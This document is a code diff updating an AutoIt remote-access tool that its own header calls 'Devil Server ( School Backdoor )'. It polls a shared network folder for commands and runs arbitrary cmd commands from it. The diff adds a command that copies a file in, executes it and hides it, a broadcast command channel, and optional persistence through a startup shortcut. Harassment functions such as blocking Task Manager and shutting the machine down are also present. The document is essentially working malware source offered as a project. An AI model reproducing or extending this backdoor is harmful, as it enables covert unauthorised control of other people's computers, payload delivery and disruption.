@@ -2,7 +2,7 @@
  
  Devil Server ( School Backdoor )
  AutoIt Version: 3.3.14.2
-  Version: Alpha (21:12 7.09.2017)
+ Version: Beta ( 18:55 8.09.2017)
 
 #ce ----------------------------------------------------------------------------
 
@@ -18,7 +18,8 @@ _Singleton("devil_check_server", 0)
 ; Read config file
 Global $Config_ClientID = IniRead("config.ini", "Config", "ClientID", "defective_client")
 Global $Config_ServerPatch = IniRead("config.ini", "Config", "ServerPatch", "C:\")
-Global $Config_FirstStart = IniRead("config.ini", "Config", "FirstStart", "0")
+Global $Config_AddToStartup = IniRead("config.ini", "Config", "AddToStartup", "False")
+Global $Config_Speed = IniRead("config.ini", "Config", "Speed", "10")
 
 ; Variables
 Global $ServerData = ""
@@ -28,13 +29,13 @@ Global $Status_BlockTaskManager = "False"
 ; ------------------------------------------------------------------------------
 
 ; Add backdoor to start-up
-If $Config_FirstStart = "1" Then
+If $Config_AddToStartup = "True" Then
 	If Not FileExists(@StartupDir & "\devil_server.lnk") Then
 		FileCreateShortcut(@ScriptFullPath, @StartupDir & "\devil_server.lnk", @ScriptDir, "", "devil_server")
 	EndIf
 
-   If FileExists(@StartupDir & "\devil_server.lnk") Then
-		IniWrite("config.ini", "Config", "FirstStart", "0")
+	If FileExists(@StartupDir & "\devil_server.lnk") Then
+		IniWrite("config.ini", "Config", "AddToStartup", "False")
 		MsgBox($MB_OK, "Devil Server", "Devil Server added to start-up!")
 	Else
 		MsgBox($MB_OK, "Devil Server", "Devil Server can not add self to the start-up! Try again!")
@@ -45,7 +46,7 @@ EndIf
 
 ; Loop
 While True
-	Sleep(100)
+	Sleep($Config_Speed)
 	$ServerData = ReadServer()
 
 	; Definition and execution of the received command
@@ -53,6 +54,8 @@ While True
 		CMDExecute($ServerData[1])
 	ElseIf $ServerData[0] = "show_message" Then
 		ShowMessageBox($ServerData[1])
+	ElseIf $ServerData[0] = "load_file" Then
+		LoadFile($ServerData[1])
 	ElseIf $ServerData[0] = "shutdown" Then
 		SystemShutdown()
 	ElseIf $ServerData[0] = "block_task_manager" Then
@@ -74,6 +77,17 @@ WEnd
 
 ; Get data from the shared folder
 Func ReadServer()
+	; Read public data
+	If FileExists($Config_ServerPatch & "\PublicData") Then
+		Local $Data[2]
+		$Data[0] = IniRead($Config_ServerPatch & "\PublicData", "Data", "Type", "")
+		$Data[1] = IniRead($Config_ServerPatch & "\PublicData", "Data", "Command", "")
+		Sleep($Config_Speed * 5)
+		FileDelete($Config_ServerPatch & "\PublicData")
+		Return $Data
+	EndIf
+
+	; Read data from server
 	If FileExists($Config_ServerPatch & "\" & $Config_ClientID) Then
 		Local $Data[2]
 		$Data[0] = IniRead($Config_ServerPatch & "\" & $Config_ClientID, "Data", "Type", "")
@@ -81,27 +95,30 @@ Func ReadServer()
 		FileDelete($Config_ServerPatch & "\" & $Config_ClientID)
 		Return $Data
 	Else
-		Local $Data = ["", ""] ; So that the code does not produce errors
+		; So that the code does not produce errors
+		Local $Data = ["", ""]
 		Return $Data
 	EndIf
+
 EndFunc
 
 ; Upload and run file
 Func LoadFile($File_name)
+	Sleep($Config_Speed + 500) ; Some delay for file loading
 	FileCopy($Config_ServerPatch & "\" & $File_name, @ScriptDir, 1)
-	FileSetAttrib($File_name, "+H")
 	FileDelete($Config_ServerPatch & "\" & $File_name)
-	ShellExecute(@ScriptDir & "\" & $File_name) ; Launch the file
+	ShellExecute($File_name) ; Launch the file
+	FileSetAttrib($File_name, "+H") ; Hide the file!
 EndFunc
 
 ; Execute to CMD
 Func CMDExecute($Command)
-	ShellExecute($Command)
+	RunWait(@ComSpec & " /c " & $Command)
 EndFunc
 
 ; Show message
 Func ShowMessageBox($Text)
-	MsgBox($MB_OK, "", $Text, 10)
+	MsgBox($MB_OK, "Message", $Text, 10)
 EndFunc
 
 ; Shutdown system
@@ -116,5 +133,5 @@ EndFunc
 
 ; Сrazy mouse
 Func CrazyMouse()
-	MouseMove(Random(0, @DesktopWidth), Random(0, @DesktopHeight), 1) ; Move mouse to random position
+	MouseMove(Random(0, @DesktopWidth), Random(0, @DesktopHeight), 3) ; Move mouse to random position
 EndFunc
